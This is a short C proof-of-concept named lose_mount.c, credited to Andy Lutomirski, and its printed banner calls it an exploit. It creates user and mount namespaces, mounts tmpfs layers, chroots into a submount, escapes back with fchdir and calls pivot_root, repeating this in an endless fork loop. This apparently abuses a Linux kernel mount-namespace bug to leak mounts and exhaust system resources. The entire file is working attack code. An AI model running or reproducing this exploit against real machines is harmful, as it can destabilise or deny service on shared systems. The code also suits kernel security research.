/*
 * lose_mount.c
 * Copyright (c) 2014 Andrew Lutomirski.  All rights reserved.
 * GPL v2
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <err.h>
#include <sys/mount.h>
#include <sys/syscall.h>
#include <sys/stat.h>

#ifndef CLONE_NEWUSER
#define CLONE_NEWUSER 0x10000000
#endif

static void set_map(const char *path, uid_t outer)
{
	char buf[1024];
	int fd = open(path, O_WRONLY);
	if (fd == -1)
		err(1, "open map");
	sprintf(buf, "0 %ld 1", (long)outer);
	if (write(fd, buf, strlen(buf)) != strlen(buf))
		err(1, "write map");
	close(fd);
}

static int child(void)
{
  int pivot_fd;
  long uid = geteuid(), gid = getegid();
  char origcwd[16384];

  if (unshare(CLONE_NEWUSER) != 0)
    err(1, "unshare(CLONE_NEWUSER)");
  if (unshare(CLONE_NEWNS) != 0)
    err(1, "unshare(CLONE_NEWNS)");

  set_map("/proc/self/uid_map", uid);
  set_map("/proc/self/gid_map", gid);

  if (mount("/", "/", NULL, MS_REC | MS_PRIVATE, NULL) != 0)
    err(1, "MS_PRIVATE");

  // Mount a new temporary root and chdir into it.
  if (!getcwd(origcwd, sizeof(origcwd)))
      err(1, "getcwd");
  if (!strcmp(origcwd, "/"))
    errx(1, "don't run from the root directory");
  if (mount("temporary_root", ".", "tmpfs", 0, NULL) != 0)
    err(1, "mount");
  if (chdir(origcwd) != 0)
    err(1, "chdir");

  pivot_fd = open(".", O_RDONLY);
  if (pivot_fd == -1)
    err(1, "open");

  // Set up the hierarchy
  if (mkdir("submount", 0700) != 0)
    err(1, "mkdir");
  if (mount("chroot", "submount", "tmpfs", 0, NULL) != 0)
    err(1, "submount");

  if (chroot("submount") != 0)
    err(1, "chroot");

  if (fchdir(pivot_fd) != 0)
    err(1, "fchdir");
  close(pivot_fd);

  if (syscall(SYS_pivot_root, ".", ".") != 0)
    err(1, "pivot_root");

  _exit(0);
}

int main(int argc, char **argv)
{
  printf("lose_mount, a confusing exploit by Andy Lutomirski\n");
  printf("If you get an error, try running from a different directory.\n");

  if (signal(SIGCHLD, SIG_DFL) != 0)
    err(1, "signal");

  while (1) {
    pid_t ret = fork();
    if (ret < 0)
      err(1, "fork");
    if (ret == 0)
      return child();

    int status;
    if (wait(&status) == -1)
      err(1, "wait");
    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0)
      errx(1, "child failed");
  }

  return 0;
}
